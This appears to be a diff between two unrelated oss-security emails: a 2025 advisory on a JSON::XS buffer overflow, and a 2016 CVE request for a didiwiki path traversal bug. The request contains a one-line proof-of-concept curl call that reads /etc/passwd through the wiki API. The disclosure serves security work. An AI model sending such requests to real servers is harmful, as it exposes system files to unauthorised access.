@@ -1,4 +1,9 @@
-Received: (qmail 24329 invoked by uid 550); 8 Sep 2025 17:46:30 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["514" "Thursday" "18" "February" "2016" "18:02:21" "-0500" "Ignace Mouzannar" "mouzannar@gmail.com" "<CADk+ZPMDvowM_5AtCL0j3wQ+Ote6HCJVbWoLJRsG_SKbpSHHmg@mail.gmail.com>" "21" "[oss-security] CVE request: didiwiki path traversal vulnerability" nil nil nil "2" "2016021823:02:21" "[oss-security] CVE request: didiwiki path traversal vulnerability" (number mark "U       mouzannar@gm Feb 18   21/514   " thread-indent "\"[oss-security] CVE request: didiwiki path traversal vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 1371 invoked by uid 550); 19 Feb 2016 09:13:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,88 +12,57 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 20221 invoked from network); 8 Sep 2025 15:42:20 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=cc:content-transfer-encoding:content-type
-	:content-type:date:date:feedback-id:feedback-id:from:from
-	:in-reply-to:message-id:mime-version:reply-to:subject:subject:to
-	:to:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=fm1; t=
-	1757346131; x=1757432531; bh=5vbdc0meTzPfo3W6kPYKpmJHlRyDC5vXwp4
-	atzuJLUg=; b=S3WhP8UzDZcxw2pwCiWQzpb3/fJ64ZEKO38J2Kp3/ch9Z01IUuo
-	T24m6VmeBP8rV9Pt09xQ+ccl1mkVQ8k7MQ76J2CqGxqCercNkdEkUNsQAcf8npO1
-	HkgGhDJXHnsXUCxlWN54+LR7k9bu5Fw2lw8nRswZSLFGKMjyyWtoec/Sd8FdIgPr
-	C/7ccMa42/pgdGJj1+acjT7mCCArdQHD/hc4iEWDBcEaZiwndVbmOpjmIFup7EXY
-	Djz1fy91L+ZEiPMLNR/lFh4QEXtMF7IXfL1/WFYckJ48rsZT4VHYHHTSooxPCDRE
-	/Ivy3f7R+toRKzyg2Rsm7iYpWhWvakVrNyg==
-X-ME-Sender: <xms:Uvm-aG__d6Z-mu2Vo7PKbP4yFDcLvI6sLV2IinJovYwfgfmY9zabhQ>
-    <xme:Uvm-aIvnC-lG3xJp8R4hbeY3-VFEXtdhaFcP_yboknCexijROjXmxyCVWntpN1kkN
-    GqpqNcMevt8MFk8>
-X-ME-Received: <xmr:Uvm-aFb5sVJaeD3K7sM5xHywhawcf4VQ0zVJaTjSuURh7qwmgy4Qsp9lG9DlraEinxBvONQZx6fe46IiTzNSP9gIg3mlOxfU>
-X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgeeffedrtdeggddujeelvdcutefuodetggdotefrod
-    ftvfcurfhrohhfihhlvgemucfhrghsthforghilhdpuffrtefokffrpgfnqfghnecuuegr
-    ihhlohhuthemuceftddtnecunecujfgurhepkfffgggfvffhufgtgfesthekredttddvje
-    enucfhrhhomheptfhosggvrhhtucftohhthhgvnhgsvghrghcuoehrrhifohestghprghn
-    rdhorhhgqeenucggtffrrghtthgvrhhnpedtjeeuueduvefflefgjeehgeffffevueeule
-    eitddutdeggefgjeetgedtveehgfenucffohhmrghinhepmhgvthgrtghprghnrdhorhhg
-    pdhstghhmhhorhhprdguvgenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepmh
-    grihhlfhhrohhmpehrrhifohestghprghnrdhorhhgpdhnsggprhgtphhtthhopedupdhm
-    ohguvgepshhmthhpohhuthdprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhish
-    htshdrohhpvghnfigrlhhlrdgtohhm
-X-ME-Proxy: <xmx:Uvm-aApjNyyAtCSAma_UizPA_5GN-Y5MIQenUZD-RIa0pXmo2TPRJg>
-    <xmx:Uvm-aC8Uc1ElI0ykd-yknDVUR2F1IRV_Ukiym2QfcZDkN3SQZ7eZcg>
-    <xmx:Uvm-aH_bdH6vnwxpciKSTMPZXQ6r3ZXE5_0XXPn8tcePrYxxtVLMKQ>
-    <xmx:Uvm-aJsunSjBxb0Dl1vE1jYYqiUWGjeCiLcWRF-3ceKFGqRWrS5PuQ>
-    <xmx:Uvm-aCoQ-RfBxyKLqwHE2dWE_vR7dDcSY4JzUlXelgOduXk_zKRszQ>
-    <xmx:U_m-aDFluk9tvOJwN4plInTnNc9z88QLo9nPHBfrOmAixMK_Fg2gqNAxuAvn>
-Feedback-ID: ia0f04183:Fastmail
-Message-ID: <37b51746-e74b-48c4-8181-46b3a1c47c42@cpan.org>
-Date: Mon, 8 Sep 2025 16:42:08 +0100
+Received: (qmail 24260 invoked from network); 18 Feb 2016 23:02:52 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=bBc29BraKq1ccJ85H+Vzq8HXnCMwij6HaLZbwjwoBU0=;
+        b=hb2Rmf/vWGgQLOjovOOO7XpR3ulXwzU/et/D4u2KKnNnrC39TYUfTaVde99q+jsXOu
+         jcMYl7qKCd+vtUcdb+b3YMAQOHyaUiQWAVPZ5hBbuQlBimQDZt7jvSVheNlYqlkc2Lnu
+         wcvaiHukUYRE7z6GtVVSbxkKGFjUtyK3cGDAsEBxf/+e7l31bZ4lh+Mxv9k6pK+cv55v
+         C0QaUuBDk8NN5aB3gNLeHX18Ky3Q0MSkjcEjKsJKeK7IVFsuL1N+iNi1EFagD0EE42lU
+         DZHB/rQwu+eYi3R0mXJmre702VHWgt2qsfigLAOXmbikLO7hkicIQJmRs9BB3Z7tReoi
+         PIiw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=bBc29BraKq1ccJ85H+Vzq8HXnCMwij6HaLZbwjwoBU0=;
+        b=Xo/DnLd1tnlNAHqbq90376b5qcojjZfsJ/nPWSTGqxvItWELdY7xdwIun2VWoy5wob
+         5qep0rdIktUu5BW+UnZH+ObS6tInVcOmNiYVfvY2MOc0KKgkTTT9BEF4eJ4mRNwtAAf7
+         GVWLUmcBbHvli37mGVXY1TgW1OUhfYlnPhEmXlzsPPXn10gU+pe6dM/0sU2IJKCXWGv2
+         eaRp++aWaUs+024c8jfm0a5cdahNC1Pjdo65KnoJm10J+iYIcc9UMleZ6XsSGbz9obFw
+         srlt+GN645wqfufnGSgdcL2Br25h0jVi8BrcUta0igGrm76lobEWivlvGGSAQ2rAqQC4
+         h8jw==
+X-Gm-Message-State: AG10YOQ3FQ8I0uZcSj32n6Jm79A1fSdX/Tn2Lb1lzj3+aB8Ie7qMAsDHAVvVHz5HA8EweQG5iC+nQaRKjXDcxg==
+X-Received: by 10.50.147.68 with SMTP id ti4mr5667106igb.1.1455836561010; Thu,
+ 18 Feb 2016 15:02:41 -0800 (PST)
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
+From: Ignace Mouzannar <mouzannar@gmail.com>
+Date: Thu, 18 Feb 2016 18:02:21 -0500
+Message-ID: <CADk+ZPMDvowM_5AtCL0j3wQ+Ote6HCJVbWoLJRsG_SKbpSHHmg@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Language: en-GB
-From: Robert Rothenberg <rrwo@cpan.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-Subject: [oss-security] CVE-2025-40928: JSON::XS before version 4.04 for Perl has an integer
- buffer overflow causing a segfault when parsing crafted JSON, enabling
- denial-of-service attacks or other unspecified
+Cc: security@debian.org, Alexander Izmailov <yarolig@gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Subject: [oss-security] CVE request: didiwiki path traversal vulnerability
 
-========================================================================
-CVE-2025-40928                                       CPAN Security Group
-========================================================================
+Hello,
 
-         CVE ID:  CVE-2025-40928
-   Distribution:  JSON-XS
-       Versions:  before 4.04
+Please can I have a CVE assigned to the following vulnerability?
 
-       MetaCPAN:  https://metacpan.org/dist/JSON-XS
-       VCS Repo:  https://cvs.schmorp.de/JSON-XS/
+- Versions Affected: all versions of didiwiki
+- Bug discovered by: Alexander Izmailov
+- Patch Available: https://github.com/OpenedHand/didiwiki/pull/1/files
+- Patch provided by: Alexander Izmailov
+- Description:
 
-JSON::XS before version 4.04 for Perl has an integer buffer overflow
-causing a segfault when parsing crafted JSON, enabling
-denial-of-service attacks or other unspecified impact
+Allows a user to access any file on the filesystem from the browser.
+To reproduce it, on Debian:
+----
+apt-get install didiwiki
 
-Description
------------
-JSON::XS before version 4.04 for Perl has an integer buffer overflow
-causing a segfault when parsing crafted JSON, enabling
-denial-of-service attacks or other unspecified impact
+curl http://localhost:8000/api/page/get?page=/etc/passwd
+----
 
-Problem types
--------------
-- CWE-122 Heap-based Buffer Overflow
+Thank you for your help.
 
-Solutions
----------
-Update to 4.04, or apply the provided patch
-
-References
-----------
-https://metacpan.org/release/MLEHMANN/JSON-XS-4.03/source/XS.xs#L256
-https://security.metacpan.org/patches/J/JSON-XS/4.03/CVE-2025-40928-r1.patch
-
-Credits
--------
-Michael Hudak of rasotec, reporter
+ Ignace M
